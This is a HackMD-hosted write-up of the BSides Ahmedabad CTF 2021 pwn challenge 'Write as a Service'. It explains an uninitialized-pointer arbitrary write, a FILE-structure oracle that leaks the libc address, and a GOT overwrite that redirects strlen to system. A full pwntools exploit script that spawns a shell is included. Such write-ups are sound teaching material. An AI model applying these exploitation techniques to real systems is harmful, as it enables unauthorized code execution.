@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="dev">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="csrf-token" content="s92JQ1tj-CGl_pTvkqPVrEtEigmj76cAO9bc">
+    
+    
+    <meta name="description" content="# Write as a Service - BSides Ahmedabad CTF 2021 ###### tags: `writeup` `BSides Ahmedabad CTF 2021` ">
+    
+    <title>Write as a Service - BSides Ahmedabad CTF 2021 - HackMD</title>
+    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
+	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
+    
+<script nonce="b43ddcac-efcc-429e-854b-f414200dbcf7">
+  window.domain = 'hackmd.io'
+  window.urlpath = ''
+  window.debug = false
+  window.version = '1.3.0'
+  window.brand = 'HackMD'
+
+  
+  window.NOTE_ID = '4Yvr1_4ATpOpAbPkfiHUUg'
+  
+
+  window.GOOGLE_API_KEY = 'AIzaSyCjSrqWHhmWJnoI7JlD88XDSaBgiKbaenA'
+  window.GOOGLE_CLIENT_ID = '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com'
+  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
+  
+  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'
+
+  window.ASSET_URL = 'https://assets.hackmd.io'
+
+  window.USER_CAN_CREATE_TEAM = true
+  window.USER_CAN_DELETE_ACCOUNT = true
+  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
+  window.PAYMENT_ENABLED = true
+  window.PAYMENT_PROMOTION_BANNER_ENABLED = 
+  window.PERSONAL_PLAN_ENABLE = true
+  window.GITHUB_SYNC_ENABLED = true
+  window.GITLAB_SYNC_ENABLED = false
+  window.GITLAB_SYNC_BASE_URL = ''
+  window.VCS_SYNC_MODE = 'github'
+  window.VCS_PROVIDER_NAME = 'GitHub'
+  window.FREE_TEAM_NUM = 20
+  window.FREE_TEAM_MEMBER_NUM = 3
+  window.FREE_PUBLIC_TEAM_NUM = 10
+  
+  window.EE_SITE_ENABLE = false
+  window.EE_SITE_NAME = 'false'
+  window.EE_SITE_LINK = 'false'
+  window.EESITE_INFO = false
+  window.ENTERPRISE_DISCOVERY_ENABLE = false
+  window.ENTERPRISE_DISCOVERY_TEAM = true
+  window.ENTERPRISE_DISCOVERY_NOTE = true
+  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
+  
+  window.ALLOW_ANONYMOUS = true
+  window.ALLOW_ANONYMOUS_EDIT = false
+  window.PUBLIC_OVERVIEW = false
+  window.INTERNAL_PUBLIC_OVERVIEW = false
+  window.FULL_TEXT_SEARCH_ENABLE = false
+
+  
+  window.SHOW_HOT_NOTES = false
+  
+
+  
+  window.HOT_NOTES_TIME_TYPE = 'week'
+  
+
+  
+  window.SHOW_OVERVIEW = false
+  
+
+  window.USE_CDN = false
+
+  
+  window.MENTIONS = {}
+  
+
+  
+  window.MENTION_ANCHORS = []
+  
+
+  
+  window.COMMENT_ANCHORS = []
+  
+
+  
+  window.IS_OWNER = false
+  
+
+  
+  window.IS_TEAM_ADMIN = false
+  
+
+  
+  window.IS_INVITEE_ADMIN = false
+  
+
+  
+  window.USER_PROFILE = {"name":"Guest Casey"}
+  
+
+  
+  window.VERSION_TIME = '1636260484989'
+  
+
+  
+  window.canEdit = false
+  
+
+  
+  window.canWriteComment = false
+  
+</script>
+
+
+    
+<!-- Google Tag Manager -->
+<script nonce="b43ddcac-efcc-429e-854b-f414200dbcf7">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
+<!-- End Google Tag Manager -->
+
+
+    <meta property="fb:app_id" content="1436904003272070">
+
+<meta name="twitter:image:src" content="https://pbs.twimg.com/profile_images/1013359539515580416/RCOMHa6H_bigger.jpg" />
+
+<meta name="twitter:site" content="@hackmdio" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Write as a Service - BSides Ahmedabad CTF 2021 - HackMD" />
+
+<meta name="twitter:description" content="# Write as a Service - BSides Ahmedabad CTF 2021 ###### tags: `writeup` `BSides Ahmedabad CTF 2021` " />
+
+
+<meta property="og:image" content="https://pbs.twimg.com/profile_images/1013359539515580416/RCOMHa6H_bigger.jpg" />
+
+<meta property="og:site_name" content="HackMD" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Write as a Service - BSides Ahmedabad CTF 2021 - HackMD" />
+
+<meta property="og:description" content="# Write as a Service - BSides Ahmedabad CTF 2021 ###### tags: `writeup` `BSides Ahmedabad CTF 2021` " />
+
+
+	
+    <link rel="stylesheet" href='https://assets.hackmd.io/build/emojify.js/dist/css/basic/emojify.min.css'>
+     <link href="https://assets.hackmd.io/build/font-vendor.808f75da673962c80518.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.1233bc7a27f833ea4984.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.384d1aed526f4021254e.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.3f17dff56214af859885.css" rel="stylesheet">
+	
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
+<![endif]-->
+
+</head>
+
+<body style="display:none;">
+    <div class="ui-infobar container-fluid unselectable hidden-print">
+        <div class="row">
+            <div class="col-xs-12 ui-infobar-inner">
+                <div class="ui-infobar__user-info">
+                    <ul class="list-inline">
+                        <li>
+                            
+                                <span class="ui-lastchangeuser" data-profile="keymoon">&thinsp;<a class="ui-user-icon small" style="background-image: url(https://pbs.twimg.com/profile_images/1013359539515580416/RCOMHa6H_normal.jpg);" target="_blank"></a></span>
+                            
+                            &nbsp;<span class="text-uppercase ui-status-lastchange"></span>
+                            <span class="ui-lastchange text-uppercase" data-createtime="Sun Nov 07 2021 03:13:19 GMT+0000 (Coordinated Universal Time)" data-updatetime="Sun Nov 07 2021 04:48:04 GMT+0000 (Coordinated Universal Time)"></span>
+                        </li>
+                        
+                        
+                        <li>
+                            <span class="ui-more-info hmd-dn" data-toggle="popover">
+                                &thinsp;<i class="fa fa-info-circle" aria-hidden="true"></i>
+
+                                <div class="more-info-raw hmd-dn">
+                                    <span class="ui-published-note note-status-row hmd-db">
+                                        <i class="fa fa-globe" aria-hidden="true" style="margin-top: 1px;"></i>
+                                        Published
+                                    </span>
+
+                                    <span class="ui-connectedGithub note-status-row hmd-dn">
+                                        <i class="fa fa-20 ui-connectedGithubIcon fa-github"></i>
+
+                                        <span>Linked with GitHub</span>
+
+                                        <br>
+
+                                        <a class="file-path" target="_blank"></a>
+                                    </span>
+                                </div>
+                            </span>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="hmd-text-right ui-infobar__actions">
+                    <ul class="list-inline">
+                        <li>
+                            
+                                <a class="ui-signin community-button hidden-xs" href="#"><span class="text"><i class="fa fa-fw fa-heart-o"></i>Like<span class="count"></span></span></a>
+                                <a class="ui-signin community-button hidden-xs" href="#"><span class="text"><i class="fa fa-fw fa-bookmark-o"></i>Bookmark</span></a>
+                                <a class="ui-signin community-button hidden-xs" href="#"><span class="text"><i class="fa fa-fw fa-bell-o"></i>Subscribe</span></a>
+                            
+                        </li>
+                        
+                    </ul>
+                </div>
+
+                <div class="clearfix"></div>
+            </div>
+        </div>
+        
+        <div class="ui-comment-app" id="hackmd-app">
+            <div id="comment-app"></div>
+        </div>
+        
+    </div>
+
+    <!-- Markdown rendered container -->
+    <div id="doc" class="container-fluid markdown-body" data-hard-breaks="true"># Write as a Service - BSides Ahmedabad CTF 2021
+###### tags: `writeup` `BSides Ahmedabad CTF 2021` `pwn`
+
+# Overview
+
+ - You can write `0x1f` bytes data to:
+   - buffer alloced on stack
+   - buffer alloced on heap
+   - `/dev/null`
+   - `stdout`
+
+# Analysis
+
+Every `read` checks the length correctly, so there is no buffer overflow.
+
+The first thing to notice is that the buf variable is uninitialized in `to_alloced_buf`.
+```cpp=
+void to_alloced_buf(void){
+  char* buf;
+  while (1){
+    if (buf == NULL) buf = (char*)malloc(BUF_SIZE);
+    printf(&#34;content?\n&gt; &#34;);
+    if (0 &lt; readline(buf, READ_SIZE)) break;
+  }
+}
+```
+
+The variable `to_alloced_buf::buf` shares its buffer with `to_local_buf::buf[0]`, `to_devnull::fp`, `to_stdout::fp`, and `menu::buf[0x18]`. As you can see, we can make arbitrary address write by modifying `to_local_buf::buf[0]` from `to_local_buf`, then call `to_alloced_buf`. Moreover, we can overwrite the `FILE` structure for `stdout` and closed `/dev/null`. Overwriting a closed file structure doesn&#39;t seem useful but overwriting a `STDOUT` file structure seems useful since you may be able to use some techniques such as [FSOP]([FSOP](https://faraz.faith/2020-10-13-FSOP-lazynote/)).
+
+# Exploit
+## libc leak
+Leaking libc address is the main part of this challenge. Let&#39;s take a look inside of `FILE` structure.
+
+```c=
+struct _IO_FILE
+{
+  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  char *_IO_read_ptr;        /* Current read pointer */
+  char *_IO_read_end;        /* End of get area. */
+  char *_IO_read_base;        /* Start of putback+get area. */
+  char *_IO_write_base;        /* Start of put area. */
+  char *_IO_write_ptr;        /* Current put pointer. */
+  char *_IO_write_end;        /* End of put area. */
+    ...
+  char _shortbuf[1];
+    ...
+};
+```
+from: [`struct_FILE.h`](https://code.woboq.org/userspace/glibc/libio/bits/types/struct_FILE.h.html#_IO_FILE)
+
+For some allignment reason, offset of `_IO_read_ptr` is 8 bytes. We can overwrite `_flags`, `_IO_read_ptr`, `_IO_read_end`, and `_IO_read_base` since we can write `0x1f` bytes. While experimenting, I found that `stdout` stops working if `_IO_read_end` is not equals to the address of `_shortbuf`.
+Using this logic as an oracle, we can leak the address of `_shortbuf`. Since `stdout` is the struct allocated on `libc`, we now know the base address of `libc`.
+
+## get the shell
+After libc address is leaked, you can do basically anything because you already have `AAW`.
+`fputs(buf, fp)` calls `strlen(buf)` internally, so we can call `system(buf)` by overwriting the GOT of `strlen` in `libc`.
+
+## solution
+
+```python=
+from pwn import *
+
+BIN_NAME = &#39;chall&#39;
+REMOTE_LIBC_PATH = &#39;libc-2.31.so&#39;
+REMOTE_ADDR = &#34;pwn.bsidesahmedabad.in&#34;
+REMOTE_PORT = &#39;9090&#39;
+LOCAL = True
+
+elf = ELF(BIN_NAME)
+context.binary = elf
+
+if LOCAL: stream = process(BIN_NAME)
+else: stream = remote(REMOTE_ADDR, REMOTE_PORT)
+TIMEOUT = 0.02 if LOCAL else 0.4
+
+def prompt(cmd):
+    if b&#39;\n&#39; in cmd: raise Exception()
+    stream.recvuntil(b&#39;&gt; &#39;, timeout=TIMEOUT)
+    stream.sendline(cmd)
+
+def localbuf(payload):
+    prompt(b&#39;0&#39;)
+    prompt(payload)
+
+def allocedbuf(payload):
+    prompt(b&#39;1&#39;)
+    prompt(payload)
+
+def devnull(payload):
+    prompt(b&#39;2&#39;)
+    prompt(payload)
+
+def stdout(payload):
+    prompt(b&#39;3&#39;)
+    prompt(payload)
+
+def is_valid_tinybuf_prefix(read_end: bytes):
+    payload = p64(0xfbad2887) + p64(0) + read_end
+    allocedbuf(payload)
+    line = stream.recv(1, timeout=TIMEOUT)
+    if len(line) != 0: return True
+    else: return False
+
+stdout(b&#39;hoge&#39;)
+
+tinybuf_addr_bytes = b&#39;&#39;
+for i in range(0, 6):
+    for b in range(256):
+        if b == ord(&#39;\n&#39;): continue
+        if i == 0 and b != 0x23: continue
+        if i == 1 and hex(b)[-1] != &#39;7&#39;: continue
+        if i == 5 and hex(b)[-2] != &#39;7&#39;: continue
+        cand = tinybuf_addr_bytes + b.to_bytes(1, &#39;little&#39;)
+        if not is_valid_tinybuf_prefix(cand):
+            print(f&#39;{b} / 256...&#39;)
+            continue
+        tinybuf_addr_bytes = cand
+        addr = unpack((tinybuf_addr_bytes + b&#39;\x00&#39; * 8)[:8])
+        print(f&#39;{hex(addr)=}&#39;)
+        break
+    else:
+        raise Exception(&#34;not found&#34;)
+tinybuf_addr = unpack((tinybuf_addr_bytes + b&#39;\x00&#39; * 8)[:8])
+
+libc = ELF(&#39;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#39; if LOCAL else REMOTE_LIBC_PATH)
+libc.address = tinybuf_addr - 0x1ec723
+
+print(f&#39;{hex(libc.address)=}&#39;)
+
+def aaw(addr, content):
+    print(f&#39;*{hex(addr)} = {hex(content)}&#39;)
+    localbuf(b&#39;A&#39; * 0x18 + p64(addr)[:6])
+    allocedbuf(p64(content))
+
+aaw(libc.address + 0x1eb0a8, libc.symbols[&#39;system&#39;])
+
+stdout(b&#39;/bin/sh&#39;)
+stream.interactive()
+```
+
+
+
+
+</div>
+
+    <div class="document-footer container-fluid hmd-pb-2 hidden-print">
+        <hr>
+        <div class="footer hmd-flex hmd-items-center">
+    <div class="footer__published-by hmd-flex-grow-1">
+        <span>Published on</span> <strong><a href="https://hackmd.io/" target="_blank"><i class="fa fa-file-text"></i> <span class="brand">HackMD</span></a></strong>
+    </div>
+    <div class="footer__views" style="margin-right: 18px;">
+        <i class="fa fa-eye"></i> <span class="ui-viewcount">95</span>
+    </div>
+    <div class="footer__views">
+    
+        <a class="ui-signin community-button" href="#"><span><i class="fa fa-fw fa-heart-o"></i><span class="text hidden-xs">Like</span><span class="count"></span></span></a>
+        <a class="ui-signin community-button" href="#"><span><i class="fa fa-fw fa-bookmark-o"></i><span class="text hidden-xs">Bookmark</span></span></a>
+        <a class="ui-signin community-button" href="#"><span><i class="fa fa-fw fa-bell-o"></i><span class="text hidden-xs">Subscribe</span></span></a>
+    
+    </div>
+</div>
+
+    </div>
+
+    <div class="ui-community unselectable hidden-print hidden-xs" style="display: none;">
+        
+            <a class="ui-signin community-button" href="#" title="Like" data-toggle="tooltip" data-placement="right" data-offset="0,5"><span><i class="fa fa-fw fa-heart-o"></i><span class="count hmd-ml-2"></span></span></a>
+            <a class="ui-signin community-button" href="#" title="Bookmark" data-toggle="tooltip" data-placement="right" data-offset="0,5"><span><i class="fa fa-fw fa-bookmark-o"></i></span></a>
+            <a class="ui-signin community-button" href="#" title="Subscribe" data-toggle="tooltip" data-placement="right" data-offset="0,5"><span ><i class="fa fa-fw fa-bell-o"></i></span></a>
+        
+    </div>
+
+    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
+        <div class="pull-left dropdown">
+            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
+                <i class="fa fa-bars"></i>
+            </a>
+            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
+            </ul>
+        </div>
+    </div>
+
+    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="display:none;"></div>
+    
+
+    <div class="clearfix"></div>
+
+    <!-- signin modal -->
+<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">&times;</span></button>
+            
+
+
+
+
+
+
+    
+
+
+
+
+
+
+<h3>Sign in</h3>
+
+<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded">
+    <div class="hmd-dn"><input type="hidden" name="_csrf" value="s92JQ1tj-CGl_pTvkqPVrEtEigmj76cAO9bc"></div>
+    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
+    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
+    <div class="form-group  ">
+        <label for="email" class="control-label">Email</label>
+        <label for="inputEmail" class="control-label pull-right errors">
+            
+        </label>
+        <span class="help-block control-label with-errors pull-right" style="display: inline;"></span>
+        <div class="input-block">
+            
+                <input type="email" class="form-control" name="email" placeholder="Your email" required autocomplete="email">
+            
+            <span class="error-sign"></span>
+        </div>
+    </div>
+    <div class="form-group ">
+        <label for="password" class="control-label">Password</label>
+        <label for="inputPassword" class="control-label pull-right errors">
+            
+        </label>
+        <span class="help-block control-label with-errors pull-right" style="display: inline;"></span>
+        <div class="input-block">
+            <input type="password" class="form-control" name="password" placeholder="Your password" required autocomplete="current-password">
+            <span class="error-sign"></span>
+            
+                <span class="control-label pull-right" style="font-size: 13px; margin-top: 5px;"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
+            
+        </div>
+    </div>
+
+    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
+        
+            <input type="submit" class="btn btn-success btn-large" formaction="https://hackmd.io/login" value="Sign in">
+        
+
+        
+    </div>
+</form>
+
+
+
+
+
+
+
+
+    
+        <p class="separator">or</p>
+    
+
+    
+        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
+    
+
+    <div class="social-buttons-container">
+    
+    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
+        <i class="fa fa-facebook"></i> Sign in via Facebook
+    </a>
+    
+    
+    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
+        <i class="fa fa-twitter"></i> Sign in via Twitter
+    </a>
+    
+    
+    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
+        <i class="fa fa-github"></i> Sign in via GitHub
+    </a>
+    
+    
+    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
+        <i class="fa fa-dropbox"></i> Sign in via Dropbox
+    </a>
+    
+    
+    <a href="https://hackmd.io/auth/google" class="btn btn-lg btn-block btn-social btn-google">
+        <i class="icon icon-google"></i> Sign in via Google
+    </a>
+    
+    
+</div>
+
+
+
+
+
+    <div >
+        <p>New to HackMD? <a href="https://hackmd.io/join">Sign up</a></p>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-60728495-1"></script>
+<script nonce="b43ddcac-efcc-429e-854b-f414200dbcf7">
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
+    gtag('config', 'UA-60728495-1', {'user_id': userid});
+</script>
+<script src="https://browser.sentry-cdn.com/5.15.5/bundle.min.js" crossorigin="anonymous"></script>
+<script nonce="b43ddcac-efcc-429e-854b-f414200dbcf7">Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });</script>
+
+
+    
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+
+    <script src="https://hackmd.io/api/i18n.js"></script>
+    
+         <script src="https://assets.hackmd.io/build/font-vendor.5ba1bda23ba5a8acfb08.js" defer="defer"></script><script src="https://assets.hackmd.io/build/common-vendor.a47b470427920f6a2576.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-vendor.0d4b711efbcbf0681727.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-common.8d9d35d8628867fb9457.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty.2ef5efc56d94c4815839.js" defer="defer"></script>
+    
+    
+
+</body>
+</html>
